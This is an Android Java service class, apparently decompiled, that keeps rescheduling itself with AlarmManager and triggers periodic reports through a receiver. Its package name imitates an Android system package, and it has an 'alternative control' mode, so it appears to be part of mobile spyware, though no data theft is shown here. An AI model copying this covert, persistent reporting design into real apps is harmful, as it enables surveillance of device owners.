package com.android.security;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.SystemClock;

public class SecurityService extends Service {
    public static PendingIntent pendingIntent;

    public static void CancelAlarm(Context context) {
        ((AlarmManager) context.getSystemService("alarm")).cancel(pendingIntent);
    }

    static void Schedule(Context context, int Seconds) {
        if (ValueProvider.IsAlternativeControlOn()) {
            ValueProvider.LogTrace("Alternative Control is on. We cant use scheduller");
            return;
        }
        pendingIntent = PendingIntent.getService(context, 0, new Intent(context, SecurityService.class), 0);
        ((AlarmManager) context.getSystemService("alarm")).set(2, SystemClock.elapsedRealtime() + ((long) (Seconds * 1000)), pendingIntent);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        ValueProvider.SetContext(this);
        if (intent != null) {
            ValueProvider.LogTrace("SecurityService::onStartCommand " + intent.toString());
        }
        CancelAlarm(this);
        ValueProvider.LogTrace("Cancel Alarm success");
        if (ValueProvider.IsUnInstalled()) {
            ValueProvider.LogTrace("Software Uninstalled");
            return 2;
        }
        ValueProvider.LogTrace("Reschedule call");
        Schedule(this, ValueProvider.TimerReportInSeconds);
        ValueProvider.LogTrace("Report from Scheduler call");
        SecurityReceiver.ReportFromScheduler(this);
        return 1;
    }
}
